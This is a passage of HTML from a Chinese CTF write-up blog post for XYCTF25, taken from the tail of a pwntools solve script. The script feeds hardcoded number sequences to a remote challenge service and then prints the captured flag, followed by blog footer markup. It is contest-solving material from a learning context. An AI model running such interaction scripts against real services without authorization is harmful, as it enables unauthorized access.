      <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> num <span class="token keyword">in</span> nums<span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ers\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> num<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ber:'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>b”Congratulations!, Here’s Your Flag flag{Greed, is……key of the life.}\n”</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">吐刀乐！</div><div id="qr" style="display:none;"><div style="display:inline-block"></div><div style="display:inline-block"></div><div style="display:inline-block"></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>不知道</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" title="XYCTF25 不知道 WP">http://example.com/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/" rel="prev" title="NCTF24 不知道 WP"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">NCTF24 不知道 WP</span></a></div><div class="post-nav-item"></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>欢迎留言~</span><br></div><div class="toggle-comment-system" style="margin: 1rem auto"><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#waline" onclick="showComment(this.dataset.target)">waline</a><style>.utterances {
  display: none;
}</style><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target=".utterances" onclick="showComment(this.dataset.target)">utterances</a><script>function hideAllComment() {
  //- hide all
  document.querySelectorAll('.toggle-comment-btn').forEach((btn) => {
    const container = document.querySelector(btn.dataset.target);
    if (container) {
      container.style.display = "none";
    }
  });
}
function showComment(target) {
  hideAllComment();
  //- show target
  const targetContainer = document.querySelector(target);
  if (targetContainer) {
    targetContainer.style.display = "block";
  }
}
</script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 不知道</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>